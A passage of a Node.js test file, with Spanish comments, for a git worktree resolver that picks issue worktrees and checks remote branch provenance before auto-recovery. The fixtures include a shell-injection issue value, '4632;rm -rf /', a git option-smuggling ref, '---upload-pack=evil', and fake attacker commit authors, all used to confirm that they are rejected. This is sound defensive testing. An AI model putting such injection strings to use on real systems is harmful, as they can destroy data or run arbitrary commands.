// =============================================================================
// Tests worktree-resolver.js — issue #2591 (fast-fail + auto-recovery validado)
//
// Cobertura:
//   - Validación dura de inputs (issue/skill) → falla loud.
//   - Parser de `git worktree list --porcelain`.
//   - Path feliz: worktree existente del issue → found:true sin recovery.
//   - Worktree faltante + no remote → found:false con reason explícita.
//   - Worktree faltante + remote sin verificar → found:false + branchOriginVerified:false.
//   - Worktree faltante + remote verificado (author allowlisted) → recovered:true.
//   - Mensajes de commit no acreditan procedencia por sí solos.
//   - Adversariales: command injection en issue/skill → rechazo upfront, sin git calls.
//   - Worktree path existe pero git no lo conoce → NO auto-borra, abortamos.
// =============================================================================
'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');

const {
    resolveExistingWorktree,
    findIssueWorktree,
    countCommitsAhead,
    parseWorktreeList,
    parseLsRemoteRefs,
    resolveDevBranch,
    remoteBranchExists,
    verifyRemoteBranchOrigin,
    attemptAutoRecovery,
    loadCommitterAllowlist,
    PIPELINE_COMMITTER_ALLOWLIST,
} = require('../worktree-resolver');

// ---- helpers de fake ---------------------------------------------------------

/**
 * Build a fake `spawnSync` que matchea por args.join(' ') contra una lista de
 * handlers ordenados. El primero que matchee se aplica. Si ninguno matchea,
 * la llamada falla loud — eso evita falsos positivos por handlers olvidados.
 */
function makeFakeSpawn(handlers) {
    return function fakeSpawn(cmd, args, _opts) {
        const joined = `${cmd} ${args.join(' ')}`;
        for (const h of handlers) {
            const match = h.match instanceof RegExp ? h.match.test(joined) : joined.includes(h.match);
            if (!match) continue;
            if (h.throw) {
                return { error: new Error(h.throw), status: null, stdout: '', stderr: '' };
            }
            return {
                error: null,
                status: h.status ?? 0,
                stdout: h.stdout ?? '',
                stderr: h.stderr ?? '',
            };
        }
        throw new Error(`fakeSpawn sin handler para: ${joined}`);
    };
}

function fakeFs(exists) {
    return { existsSync: (p) => (typeof exists === 'function' ? exists(p) : !!exists) };
}

// ---- parseWorktreeList -------------------------------------------------------

test('parseWorktreeList — parsea múltiples entradas con branch', () => {
    const input = [
        'worktree /c/Workspaces/Intrale/platform',
        'HEAD aaa',
        'branch refs/heads/main',
        '',
        'worktree /c/Workspaces/Intrale/platform.agent-2505-delivery',
        'HEAD bbb',
        'branch refs/heads/agent/2505-delivery',
        '',
    ].join('\n');
    const parsed = parseWorktreeList(input);
    assert.equal(parsed.length, 2);
    assert.equal(parsed[1].worktree, '/c/Workspaces/Intrale/platform.agent-2505-delivery');
    assert.equal(parsed[1].branch, 'refs/heads/agent/2505-delivery');
});

test('parseWorktreeList — tolera entrada sin trailing newline', () => {
    const parsed = parseWorktreeList('worktree /repo\nHEAD aaa\nbranch refs/heads/main');
    assert.equal(parsed.length, 1);
    assert.equal(parsed[0].worktree, '/repo');
});

test('parseWorktreeList — input vacío devuelve []', () => {
    assert.deepEqual(parseWorktreeList(''), []);
    assert.deepEqual(parseWorktreeList(null), []);
});

// ---- findIssueWorktree -------------------------------------------------------

test('findIssueWorktree — encuentra el worktree del issue', () => {
    const spawnImpl = makeFakeSpawn([
        {
            match: 'git worktree list --porcelain',
            stdout: [
                'worktree /repo',
                'HEAD a',
                'branch refs/heads/main',
                '',
                'worktree /tmp/platform.agent-2505-delivery',
                'HEAD b',
                'branch refs/heads/agent/2505-delivery',
                '',
            ].join('\n'),
        },
    ]);
    const fsImpl = fakeFs(true);
    const result = findIssueWorktree('/repo', 2505, { spawnImpl, fsImpl });
    assert.ok(result);
    assert.equal(result.worktree, '/tmp/platform.agent-2505-delivery');
});

test('findIssueWorktree — null si el path no existe físicamente', () => {
    const spawnImpl = makeFakeSpawn([
        {
            match: 'git worktree list --porcelain',
            stdout: 'worktree /tmp/platform.agent-2505-delivery\nHEAD x\nbranch refs/heads/agent/2505-delivery\n\n',
        },
    ]);
    const fsImpl = fakeFs((p) => p === '/repo'); // Solo ROOT existe
    const result = findIssueWorktree('/repo', 2505, { spawnImpl, fsImpl });
    assert.equal(result, null);
});

test('findIssueWorktree — desambigua por skill exacto cuando hay varios worktrees (#3736)', () => {
    // El issue 3736 tiene DOS worktrees: backend-dev (vacío, primero alfabético)
    // y pipeline-dev (con el trabajo). Con skill=pipeline-dev debe elegir ese,
    // no el primer match alfabético.
    const spawnImpl = makeFakeSpawn([
        {
            match: 'git worktree list --porcelain',
            stdout: [
                'worktree /repo',
                'branch refs/heads/main',
                '',
                'worktree /tmp/platform.agent-3736-backend-dev',
                'branch refs/heads/agent/3736-backend-dev',
                '',
                'worktree /tmp/platform.agent-3736-pipeline-dev',
                'branch refs/heads/agent/3736-pipeline-dev',
                '',
            ].join('\n'),
        },
    ]);
    const fsImpl = fakeFs(true);
    const result = findIssueWorktree('/repo', 3736, { spawnImpl, fsImpl, skill: 'pipeline-dev' });
    assert.ok(result);
    assert.equal(result.worktree, '/tmp/platform.agent-3736-pipeline-dev');
});

test('findIssueWorktree — sin match exacto de skill cae al primer candidato (legacy)', () => {
    const spawnImpl = makeFakeSpawn([
        {
            match: 'git worktree list --porcelain',
            stdout: [
                'worktree /tmp/platform.agent-3736-backend-dev',
                'branch refs/heads/agent/3736-backend-dev',
                '',
                'worktree /tmp/platform.agent-3736-pipeline-dev',
                'branch refs/heads/agent/3736-pipeline-dev',
                '',
            ].join('\n'),
        },
    ]);
    const fsImpl = fakeFs(true);
    // skill que no matchea ninguno → primer candidato.
    const result = findIssueWorktree('/repo', 3736, { spawnImpl, fsImpl, skill: 'android-dev' });
    assert.ok(result);
    assert.equal(result.worktree, '/tmp/platform.agent-3736-backend-dev');
});

test('findIssueWorktree — sin skill mantiene comportamiento legacy (primer match)', () => {
    const spawnImpl = makeFakeSpawn([
        {
            match: 'git worktree list --porcelain',
            stdout: [
                'worktree /tmp/platform.agent-3736-backend-dev',
                'branch refs/heads/agent/3736-backend-dev',
                '',
                'worktree /tmp/platform.agent-3736-pipeline-dev',
                'branch refs/heads/agent/3736-pipeline-dev',
                '',
            ].join('\n'),
        },
    ]);
    const result = findIssueWorktree('/repo', 3736, { spawnImpl, fsImpl: fakeFs(true) });
    assert.ok(result);
    assert.equal(result.worktree, '/tmp/platform.agent-3736-backend-dev');
});

test('findIssueWorktree — skill exacto ignora candidato cuyo path no existe', () => {
    // El worktree del skill exacto existe en git pero NO en disco → debe caer
    // al otro candidato válido en vez de devolver uno fantasma.
    const spawnImpl = makeFakeSpawn([
        {
            match: 'git worktree list --porcelain',
            stdout: [
                'worktree /tmp/platform.agent-3736-backend-dev',
                'branch refs/heads/agent/3736-backend-dev',
                '',
                'worktree /tmp/platform.agent-3736-pipeline-dev',
                'branch refs/heads/agent/3736-pipeline-dev',
                '',
            ].join('\n'),
        },
    ]);
    const fsImpl = fakeFs((p) => p !== '/tmp/platform.agent-3736-pipeline-dev');
    const result = findIssueWorktree('/repo', 3736, { spawnImpl, fsImpl, skill: 'pipeline-dev' });
    assert.ok(result);
    assert.equal(result.worktree, '/tmp/platform.agent-3736-backend-dev');
});

test('findIssueWorktree — null si ningún worktree matchea', () => {
    const spawnImpl = makeFakeSpawn([
        {
            match: 'git worktree list --porcelain',
            stdout: 'worktree /repo\nHEAD a\nbranch refs/heads/main\n\n',
        },
    ]);
    const result = findIssueWorktree('/repo', 9999, { spawnImpl, fsImpl: fakeFs(true) });
    assert.equal(result, null);
});

// ---- findIssueWorktree: colisión de múltiples worktrees por issue (#3733) ----

// Salida de `git worktree list` con DOS worktrees para el mismo issue 3733:
//   - backend-dev: 0 commits sobre origin/main (huérfano de un misroute).
//   - pipeline-dev: 1 commit (el trabajo real).
// El backend-dev aparece PRIMERO en el listado (orden de creación), que era
// justo lo que el resolver elegía mal antes del fix.
const MULTI_WORKTREE_3733 = [
    'worktree /repo',
    'HEAD a',
    'branch refs/heads/main',
    '',
    'worktree /tmp/platform.agent-3733-backend-dev',
    'HEAD bbb',
    'branch refs/heads/agent/3733-backend-dev',
    '',
    'worktree /tmp/platform.agent-3733-pipeline-dev',
    'HEAD ccc',
    'branch refs/heads/agent/3733-pipeline-dev',
    '',
].join('\n');

test('findIssueWorktree — colisión: elige el worktree con commits, no el primero', () => {
    // Reproduce el incidente #3733 rev-1: el linter corre como skill="linter"
    // (no nombra ningún worktree) → desempata por commits sobre origin/main.
    const spawnImpl = makeFakeSpawn([
        { match: 'git worktree list --porcelain', stdout: MULTI_WORKTREE_3733 },
        { match: 'git rev-list --count origin/main..refs/heads/agent/3733-backend-dev', stdout: '0\n' },
        { match: 'git rev-list --count origin/main..refs/heads/agent/3733-pipeline-dev', stdout: '1\n' },
    ]);
    const result = findIssueWorktree('/repo', 3733, { skill: 'linter', spawnImpl, fsImpl: fakeFs(true) });
    assert.ok(result);
    assert.equal(result.worktree, '/tmp/platform.agent-3733-pipeline-dev');
});

test('findIssueWorktree — colisión: match exacto por skill tiene prioridad', () => {
    // Cuando la fase conoce el skill del dev, el match exacto gana sin necesidad
    // de contar commits (no se espera ninguna llamada a rev-list).
    const spawnImpl = makeFakeSpawn([
        { match: 'git worktree list --porcelain', stdout: MULTI_WORKTREE_3733 },
    ]);
    const result = findIssueWorktree('/repo', 3733, { skill: 'backend-dev', spawnImpl, fsImpl: fakeFs(true) });
    assert.ok(result);
    assert.equal(result.worktree, '/tmp/platform.agent-3733-backend-dev');
});

test('findIssueWorktree — colisión sin skill: desempata por más commits', () => {
    const spawnImpl = makeFakeSpawn([
        { match: 'git worktree list --porcelain', stdout: MULTI_WORKTREE_3733 },
        { match: 'git rev-list --count origin/main..refs/heads/agent/3733-backend-dev', stdout: '0\n' },
        { match: 'git rev-list --count origin/main..refs/heads/agent/3733-pipeline-dev', stdout: '3\n' },
    ]);
    const result = findIssueWorktree('/repo', 3733, { spawnImpl, fsImpl: fakeFs(true) });
    assert.equal(result.worktree, '/tmp/platform.agent-3733-pipeline-dev');
});

test('findIssueWorktree — un solo candidato NO dispara rev-list (sin costo extra)', () => {
    // Garantiza que el path feliz (un worktree por issue) no agrega git calls:
    // si se invocara rev-list, fakeSpawn lanzaría por falta de handler.
    const spawnImpl = makeFakeSpawn([
        {
            match: 'git worktree list --porcelain',
            stdout: [
                'worktree /repo', 'HEAD a', 'branch refs/heads/main', '',
                'worktree /tmp/platform.agent-2505-delivery', 'HEAD b',
                'branch refs/heads/agent/2505-delivery', '',
            ].join('\n'),
        },
    ]);
    const result = findIssueWorktree('/repo', 2505, { skill: 'linter', spawnImpl, fsImpl: fakeFs(true) });
    assert.equal(result.worktree, '/tmp/platform.agent-2505-delivery');
});

// ---- findIssueWorktree: rama contaminada que no matchea el issue (#4800) -----

// Reproduce el incidente #4800 rev-3: el directorio `platform.agent-4800-pipeline-dev`
// quedó con la rama `agent/4807-onboarding-descriptor-completo` checked-out
// (contaminación por branch-switching). El resolver previo lo devolvía por
// basename y, teniendo MÁS commits-ahead, ganaba la desambiguación → verificacion
// diffeaba #4807 y rebotaba #4800 como falso negativo. El sibling backend-dev SÍ
// tiene la rama correcta agent/4800-*.
const MULTI_WORKTREE_4800_CONTAMINADO = [
    'worktree /repo',
    'branch refs/heads/main',
    '',
    'worktree /tmp/platform.agent-4800-backend-dev',
    'branch refs/heads/agent/4800-backend-dev',
    '',
    'worktree /tmp/platform.agent-4800-pipeline-dev',
    'branch refs/heads/agent/4807-onboarding-descriptor-completo',
    '',
].join('\n');

test('findIssueWorktree — descarta worktree cuya rama checked-out no matchea el issue (#4800)', () => {
    // Aunque el worktree contaminado tenga MÁS commits-ahead, no debe elegirse:
    // su rama (agent/4807-*) no corresponde al issue 4800.
    const spawnImpl = makeFakeSpawn([
        { match: 'git worktree list --porcelain', stdout: MULTI_WORKTREE_4800_CONTAMINADO },
        // Solo debería puntuarse el candidato que SÍ matchea la rama del issue.
        { match: 'git rev-list --count origin/main..refs/heads/agent/4800-backend-dev', stdout: '1\n' },
    ]);
    const result = findIssueWorktree('/repo', 4800, { spawnImpl, fsImpl: fakeFs(true) });
    assert.ok(result);
    assert.equal(result.worktree, '/tmp/platform.agent-4800-backend-dev');
    assert.equal(result.branch, 'refs/heads/agent/4800-backend-dev');
});

test('findIssueWorktree — skill exacto NO elige worktree contaminado (rama de otro issue) (#4800)', () => {
    // Aunque el skill pida exactamente pipeline-dev, si ese worktree tiene rama
    // de otro issue queda fuera del pool y gana el candidato con rama correcta.
    const spawnImpl = makeFakeSpawn([
        { match: 'git worktree list --porcelain', stdout: MULTI_WORKTREE_4800_CONTAMINADO },
        { match: 'git rev-list --count origin/main..refs/heads/agent/4800-backend-dev', stdout: '1\n' },
    ]);
    const result = findIssueWorktree('/repo', 4800, { spawnImpl, fsImpl: fakeFs(true), skill: 'pipeline-dev' });
    assert.ok(result);
    assert.equal(result.worktree, '/tmp/platform.agent-4800-backend-dev');
});

test('findIssueWorktree — único candidato contaminado se conserva (sin regresión, deja auto-recovery al caller)', () => {
    // Si el ÚNICO worktree del issue tiene rama de otro issue (o detached), NO lo
    // descartamos silenciosamente: mantenemos el comportamiento previo (devolverlo)
    // para no romper flujos con rama de slug no estándar ni disparar recovery espurio.
    const spawnImpl = makeFakeSpawn([
        {
            match: 'git worktree list --porcelain',
            stdout: [
                'worktree /repo', 'branch refs/heads/main', '',
                'worktree /tmp/platform.agent-4800-pipeline-dev',
                'branch refs/heads/agent/4807-onboarding-descriptor-completo', '',
            ].join('\n'),
        },
    ]);
    const result = findIssueWorktree('/repo', 4800, { spawnImpl, fsImpl: fakeFs(true) });
    assert.ok(result);
    assert.equal(result.worktree, '/tmp/platform.agent-4800-pipeline-dev');
});

// ---- countCommitsAhead -------------------------------------------------------

test('countCommitsAhead — parsea el conteo de rev-list', () => {
    const spawnImpl = makeFakeSpawn([
        { match: 'git rev-list --count origin/main..refs/heads/agent/3733-pipeline-dev', stdout: '4\n' },
    ]);
    assert.equal(countCommitsAhead('/repo', 'refs/heads/agent/3733-pipeline-dev', { spawnImpl }), 4);
});

test('countCommitsAhead — 0 ante fallo de git (best-effort)', () => {
    const spawnImpl = makeFakeSpawn([
        { match: 'git rev-list --count', status: 128, stderr: 'fatal: bad revision' },
    ]);
    assert.equal(countCommitsAhead('/repo', 'refs/heads/x', { spawnImpl }), 0);
});

test('countCommitsAhead — 0 si branchRef es null', () => {
    const spawnImpl = makeFakeSpawn([]); // No debería invocarse
    assert.equal(countCommitsAhead('/repo', null, { spawnImpl }), 0);
});

// ---- remoteBranchExists ------------------------------------------------------

test('remoteBranchExists — true si ls-remote devuelve refs', () => {
    const spawnImpl = makeFakeSpawn([
        { match: 'git ls-remote --heads origin', stdout: 'abc123\trefs/heads/agent/2505-delivery\n' },
    ]);
    assert.equal(remoteBranchExists('/repo', 'agent/2505-delivery', { spawnImpl }), true);
});

test('remoteBranchExists — false si stdout vacío', () => {
    const spawnImpl = makeFakeSpawn([
        { match: 'git ls-remote --heads origin', stdout: '' },
    ]);
    assert.equal(remoteBranchExists('/repo', 'agent/9999-x', { spawnImpl }), false);
});

test('remoteBranchExists — false si git falla', () => {
    const spawnImpl = makeFakeSpawn([
        { match: 'git ls-remote --heads origin', status: 128, stderr: 'fatal: no upstream' },
    ]);
    assert.equal(remoteBranchExists('/repo', 'agent/9999-x', { spawnImpl }), false);
});

// ---- verifyRemoteBranchOrigin -----------------------------------------------

test('verifyRemoteBranchOrigin — acepta autor en allowlist', () => {
    const spawnImpl = makeFakeSpawn([
        { match: 'git fetch', stdout: '' },
        { match: 'git log --reverse --format=%ae', stdout: 'noreply@anthropic.com\n' },
    ]);
    const v = verifyRemoteBranchOrigin('/repo', 'agent/2505-delivery', { spawnImpl });
    assert.equal(v.ok, true);
    assert.match(v.reason, /author-allowlisted/);
});

test('verifyRemoteBranchOrigin — acepta backend-dev-agent@intrale con defaults', () => {
    const spawnImpl = makeFakeSpawn([
        { match: 'git fetch', stdout: '' },
        { match: 'git log --reverse --format=%ae', stdout: 'backend-dev-agent@intrale\n' },
    ]);
    const v = verifyRemoteBranchOrigin('/repo', 'agent/2505-delivery', { spawnImpl });
    assert.equal(v.ok, true);
    assert.equal(v.reason, 'author-allowlisted:backend-dev-agent@intrale');
});

test('verifyRemoteBranchOrigin — acepta identidad histórica bot@intrale.com', () => {
    const spawnImpl = makeFakeSpawn([
        { match: 'git fetch', stdout: '' },
        { match: 'git log --reverse --format=%ae', stdout: 'bot@intrale.com\n' },
    ]);
    const v = verifyRemoteBranchOrigin('/repo', 'agent/2505-delivery', { spawnImpl });
    assert.equal(v.ok, true);
});

test('verifyRemoteBranchOrigin — un marker pipeline-v2 no acredita autor desconocido', () => {
    const spawnImpl = makeFakeSpawn([
        { match: 'git fetch', stdout: '' },
        { match: 'git log --reverse --format=%ae', stdout: 'attacker@evil.com\n' },
    ]);
    const v = verifyRemoteBranchOrigin('/repo', 'agent/2505-delivery', { spawnImpl });
    assert.equal(v.ok, false);
    assert.match(v.reason, /author-not-allowlisted:attacker@evil\.com/);
});

test('verifyRemoteBranchOrigin — rechaza autor desconocido sin marker', () => {
    const spawnImpl = makeFakeSpawn([
        { match: 'git fetch', stdout: '' },
        { match: 'git log --reverse --format=%ae', stdout: 'attacker@evil.com\n' },
        { match: 'git log --format=%B', stdout: 'fix: algo random\n' },
    ]);
    const v = verifyRemoteBranchOrigin('/repo', 'agent/2505-malicious', { spawnImpl });
    assert.equal(v.ok, false);
    assert.match(v.reason, /author-not-allowlisted:attacker@evil\.com/);
});

test('verifyRemoteBranchOrigin — rechaza si fetch falla (conservador)', () => {
    const spawnImpl = makeFakeSpawn([
        { match: 'git fetch', status: 128, stderr: 'fatal: network' },
    ]);
    const v = verifyRemoteBranchOrigin('/repo', 'agent/2505-x', { spawnImpl });
    assert.equal(v.ok, false);
    assert.match(v.reason, /fetch-failed/);
});

// ---- parseLsRemoteRefs -------------------------------------------------------

test('parseLsRemoteRefs — extrae nombres de rama sin refs/heads/', () => {
    const out = [
        '3ab808cd6e98a1dce2bc846d145f3d11ac91bd1c\trefs/heads/agent/4632-operator-absence-policy',
        '894ffb3c20031acc8436e603fd1ed12427638b61\trefs/heads/agent/4632-pipeline-dev',
    ].join('\n');
    assert.deepEqual(parseLsRemoteRefs(out), [
        'agent/4632-operator-absence-policy',
        'agent/4632-pipeline-dev',
    ]);
});

test('parseLsRemoteRefs — input vacío o basura devuelve []', () => {
    assert.deepEqual(parseLsRemoteRefs(''), []);
    assert.deepEqual(parseLsRemoteRefs(null), []);
    assert.deepEqual(parseLsRemoteRefs('línea que no matchea\n'), []);
});

// ---- resolveDevBranch --------------------------------------------------------

test('resolveDevBranch — resuelve la rama real cuando existe agent/<n>-<slug> y no agent/<n>-build (#4632)', () => {
    // Caso #4632: la fase build busca su worktree pero la rama es el slug del dev,
    // no `agent/4632-build`. Con una sola rama presente + verificada, la elige.
    const spawnImpl = makeFakeSpawn([
        { match: 'git ls-remote --heads origin refs/heads/agent/4632-*', stdout: 'aaa\trefs/heads/agent/4632-operator-absence-policy\n' },
        { match: 'git fetch', stdout: '' },
        { match: 'git log --reverse --format=%ae', stdout: 'noreply@anthropic.com\n' },
    ]);
    const r = resolveDevBranch('/repo', 4632, { spawnImpl });
    assert.equal(r.ok, true);
    assert.equal(r.branch, 'agent/4632-operator-absence-policy');
    assert.equal(r.reason, 'single-verified');
    assert.equal(r.branchOriginVerified, true);
});

test('resolveDevBranch — desambigua entre 2 ramas verificadas por más commits-ahead', () => {
    // Caso real #4632: dos ramas de dev verificadas (operator-absence-policy +
    // pipeline-dev). Elige la de más commits sobre origin/main.
    const spawnImpl = makeFakeSpawn([
        {
            match: 'git ls-remote --heads origin refs/heads/agent/4632-*',
            stdout: [
                'aaa\trefs/heads/agent/4632-operator-absence-policy',
                'bbb\trefs/heads/agent/4632-pipeline-dev',
            ].join('\n') + '\n',
        },
        // ambas verifican por autor allowlisted
        { match: 'git fetch', stdout: '' },
        { match: 'git log --reverse --format=%ae', stdout: 'noreply@anthropic.com\n' },
        // desambiguación por commits-ahead
        { match: 'git rev-list --count origin/main..origin/agent/4632-operator-absence-policy', stdout: '5\n' },
        { match: 'git rev-list --count origin/main..origin/agent/4632-pipeline-dev', stdout: '2\n' },
    ]);
    const r = resolveDevBranch('/repo', 4632, { spawnImpl });
    assert.equal(r.ok, true);
    assert.equal(r.branch, 'agent/4632-operator-absence-policy');
    assert.match(r.reason, /disambiguated-commits-ahead:5/);
    assert.equal(r.branchOriginVerified, true);
});

test('resolveDevBranch — elige la verificada aunque otra NO verificada tenga más commits (seguridad)', () => {
    // La rama del atacante tiene MÁS commits, pero NO pasa la verificación de
    // procedencia. El orden descubrir→verificar→desambiguar garantiza que nunca
    // gana. No debe llamarse rev-list sobre la rama del atacante.
    const spawnImpl = makeFakeSpawn([
        {
            match: 'git ls-remote --heads origin refs/heads/agent/4632-*',
            stdout: [
                'aaa\trefs/heads/agent/4632-legit-dev',
                'bbb\trefs/heads/agent/4632-attacker',
            ].join('\n') + '\n',
        },
        { match: 'git fetch --quiet --no-tags origin refs/heads/agent/4632-legit-dev', stdout: '' },
        { match: 'git log --reverse --format=%ae origin/main..origin/agent/4632-legit-dev', stdout: 'noreply@anthropic.com\n' },
        { match: 'git fetch --quiet --no-tags origin refs/heads/agent/4632-attacker', stdout: '' },
        { match: 'git log --reverse --format=%ae origin/main..origin/agent/4632-attacker', stdout: 'attacker@evil.com\n' },
        { match: 'git log --format=%B origin/main..origin/agent/4632-attacker', stdout: 'muchos commits maliciosos\n' },
        // Solo la legit se puntúa por commits-ahead.
        { match: 'git rev-list --count origin/main..origin/agent/4632-legit-dev', stdout: '1\n' },
    ]);
    const r = resolveDevBranch('/repo', 4632, { spawnImpl });
    assert.equal(r.ok, true);
    assert.equal(r.branch, 'agent/4632-legit-dev');
    assert.equal(r.branchOriginVerified, true);
});

test('resolveDevBranch — 0 ramas pasan verificación → rechaza sin materializar (escala sin loop)', () => {
    const spawnImpl = makeFakeSpawn([
        { match: 'git ls-remote --heads origin refs/heads/agent/4632-*', stdout: 'bbb\trefs/heads/agent/4632-attacker\n' },
        { match: 'git fetch', stdout: '' },
        { match: 'git log --reverse --format=%ae', stdout: 'attacker@evil.com\n' },
        { match: 'git log --format=%B', stdout: 'payload\n' },
    ]);
    const r = resolveDevBranch('/repo', 4632, { spawnImpl });
    assert.equal(r.ok, false);
    assert.equal(r.branchOriginVerified, false);
    assert.match(r.reason, /branch-origin-unverified/);
});

test('resolveDevBranch — sin ninguna rama remota → remote-branch-missing (null)', () => {
    const spawnImpl = makeFakeSpawn([
        { match: 'git ls-remote --heads origin refs/heads/agent/4632-*', stdout: '' },
    ]);
    const r = resolveDevBranch('/repo', 4632, { spawnImpl });
    assert.equal(r.ok, false);
    assert.equal(r.branchOriginVerified, null);
    assert.match(r.reason, /remote-branch-missing/);
});

test('resolveDevBranch — issue no numérico rechazado ANTES de tocar el remoto', () => {
    let called = false;
    const spawnImpl = () => { called = true; return { status: 0, stdout: '', stderr: '', error: null }; };
    assert.throws(
        () => resolveDevBranch('/repo', '4632;rm -rf /', { spawnImpl }),
        (e) => e.code === 'INVALID_ISSUE',
    );
    assert.equal(called, false, 'No debe ejecutar git ante issue adversarial');
});

test('resolveDevBranch — descarta refs con metacaracteres (shape DEV_BRANCH_RE)', () => {
    // Un ref remoto con shape inválida (opción de git / metacaracter) se descarta
    // en el filtro estructural → como si no hubiera candidatas.
    const spawnImpl = makeFakeSpawn([
        {
            match: 'git ls-remote --heads origin refs/heads/agent/4632-*',
            stdout: 'ccc\trefs/heads/agent/4632---upload-pack=evil\n',
        },
    ]);
    const r = resolveDevBranch('/repo', 4632, { spawnImpl });
    assert.equal(r.ok, false);
    assert.match(r.reason, /remote-branch-missing/);
});

// ---- attemptAutoRecovery -----------------------------------------------------

test('attemptAutoRecovery — branch verificada → worktree add OK', () => {
    const spawnImpl = makeFakeSpawn([
        { match: 'git ls-remote', stdout: 'abc\trefs/heads/agent/2505-delivery\n' },
        { match: 'git fetch', stdout: '' },
        { match: 'git log --reverse --format=%ae', stdout: 'noreply@anthropic.com\n' },
        { match: 'git worktree prune', stdout: '' },
        { match: 'git worktree add', stdout: '' },
    ]);
    const fsImpl = fakeFs(false); // path no existe
    const result = attemptAutoRecovery('/repo', '2505', 'delivery', { spawnImpl, fsImpl });
    assert.equal(result.ok, true);
    assert.equal(result.branchOriginVerified, true);
});

test('attemptAutoRecovery — sin remote → abort branchOriginVerified:null', () => {
    const spawnImpl = makeFakeSpawn([
        { match: 'git ls-remote', stdout: '' },
    ]);
    const fsImpl = fakeFs(false);
    const result = attemptAutoRecovery('/repo', '2505', 'delivery', { spawnImpl, fsImpl });
    assert.equal(result.ok, false);
    assert.equal(result.branchOriginVerified, null);
    assert.match(result.reason, /remote-branch-missing/);
});

test('attemptAutoRecovery — remote no verificado → abort branchOriginVerified:false', () => {
    const spawnImpl = makeFakeSpawn([
        { match: 'git ls-remote', stdout: 'abc\trefs/heads/agent/2505-malicious\n' },
        { match: 'git fetch', stdout: '' },
        { match: 'git log --reverse --format=%ae', stdout: 'attacker@evil.com\n' },
        { match: 'git log --format=%B', stdout: 'malicious commit\n' },
    ]);
    const fsImpl = fakeFs(false);
    const logs = [];
    const result = attemptAutoRecovery('/repo', '2505', 'delivery', {
        spawnImpl, fsImpl, log: (m) => logs.push(m),
    });
    assert.equal(result.ok, false);
    assert.equal(result.branchOriginVerified, false);
    assert.match(result.reason, /branch-origin-unverified/);
    assert.ok(logs.some(l => l.includes('auto-recovery rechazado')));
});

test('attemptAutoRecovery — path ya existe sin entry git → NO auto-borra', () => {
    // #4653 — la rama se resuelve y verifica ANTES del check de path (el path
    // deriva del slug de la rama), así que ahora hay ls-remote+fetch+log.
    const spawnImpl = makeFakeSpawn([
        { match: 'git ls-remote', stdout: 'abc\trefs/heads/agent/2505-delivery\n' },
        { match: 'git fetch', stdout: '' },
        { match: 'git log --reverse --format=%ae', stdout: 'noreply@anthropic.com\n' },
    ]);
    const fsImpl = fakeFs(true);
    const result = attemptAutoRecovery('/repo', '2505', 'delivery', { spawnImpl, fsImpl });
    assert.equal(result.ok, false);
    assert.match(result.reason, /worktree-path-exists-without-git-entry/);
    // Ya verificamos procedencia antes del abort por path existente.
    assert.equal(result.branchOriginVerified, true);
});

// ---- resolveExistingWorktree -------------------------------------------------

test('resolveExistingWorktree — worktree encontrado → found:true sin recovery', () => {
    const spawnImpl = makeFakeSpawn([
        {
            match: 'git worktree list --porcelain',
            stdout: 'worktree /tmp/platform.agent-2505-delivery\nHEAD x\nbranch refs/heads/agent/2505-delivery\n\n',
        },
    ]);
    const result = resolveExistingWorktree({
        ROOT: '/repo', issue: 2505, skill: 'delivery',
        spawnImpl, fsImpl: fakeFs(true),
    });
    assert.equal(result.found, true);
    assert.equal(result.recovered, false);
    assert.equal(result.worktreePath, '/tmp/platform.agent-2505-delivery');
});

test('resolveExistingWorktree — sin worktree + sin recovery → found:false', () => {
    const spawnImpl = makeFakeSpawn([
        { match: 'git worktree list --porcelain', stdout: 'worktree /repo\nbranch refs/heads/main\n\n' },
    ]);
    const result = resolveExistingWorktree({
        ROOT: '/repo', issue: 2505, skill: 'delivery',
        spawnImpl, fsImpl: fakeFs((p) => p === '/repo'),
        allowAutoRecovery: false,
    });
    assert.equal(result.found, false);
    assert.equal(result.reason, 'no-worktree-and-recovery-disabled');
});

test('resolveExistingWorktree — auto-recovery exitoso → found:true recovered:true', () => {
    const calls = [];
    const spawnImpl = makeFakeSpawn([
        // 1. búsqueda inicial: NO encuentra
        { match: 'git worktree list --porcelain', stdout: 'worktree /repo\nbranch refs/heads/main\n\n' },
        // 2. auto-recovery: ls-remote + fetch + log + add
        { match: 'git ls-remote', stdout: 'abc\trefs/heads/agent/2505-delivery\n' },
        { match: 'git fetch', stdout: '' },
        { match: 'git log --reverse --format=%ae', stdout: 'noreply@anthropic.com\n' },
        { match: 'git worktree prune', stdout: '' },
        { match: 'git worktree add', stdout: '' },
    ]);
    const fsImpl = fakeFs((p) => p === '/repo'); // worktree NO existe pero ROOT sí
    const result = resolveExistingWorktree({
        ROOT: '/repo', issue: 2505, skill: 'delivery',
        spawnImpl, fsImpl,
        log: (m) => calls.push(m),
    });
    assert.equal(result.found, true);
    assert.equal(result.recovered, true);
    assert.equal(result.branchOriginVerified, true);
});

test('resolveExistingWorktree — auto-recovery rechazado por procedencia → found:false branchOriginVerified:false', () => {
    const spawnImpl = makeFakeSpawn([
        { match: 'git worktree list --porcelain', stdout: 'worktree /repo\nbranch refs/heads/main\n\n' },
        { match: 'git ls-remote', stdout: 'abc\trefs/heads/agent/2505-malicious\n' },
        { match: 'git fetch', stdout: '' },
        { match: 'git log --reverse --format=%ae', stdout: 'attacker@evil.com\n' },
        { match: 'git log --format=%B', stdout: 'malicious payload\n' },
    ]);
    const fsImpl = fakeFs((p) => p === '/repo');
    const result = resolveExistingWorktree({
        ROOT: '/repo', issue: 2505, skill: 'delivery',
        spawnImpl, fsImpl,
    });
    assert.equal(result.found, false);
    assert.equal(result.branchOriginVerified, false);
    assert.match(result.reason, /branch-origin-unverified/);
});

test('resolveExistingWorktree — propaga config hasta verificar y recuperar la rama', () => {
    const spawnImpl = makeFakeSpawn([
        { match: 'git worktree list --porcelain', stdout: 'worktree /repo\nbranch refs/heads/main\n\n' },
        { match: 'git ls-remote', stdout: 'abc\trefs/heads/agent/2505-custom\n' },
        { match: 'git fetch', stdout: '' },
        { match: 'git log --reverse --format=%ae', stdout: 'config-only-agent@intrale\n' },
        { match: 'git worktree prune', stdout: '' },
        { match: 'git worktree add', stdout: '' },
    ]);
    const result = resolveExistingWorktree({
        ROOT: '/repo', issue: 2505, skill: 'delivery',
        spawnImpl,
        fsImpl: fakeFs((p) => p === '/repo'),
        config: { worktree_provenance: { committers: ['config-only-agent@intrale'] } },
    });

    assert.equal(result.found, true);
    assert.equal(result.recovered, true);
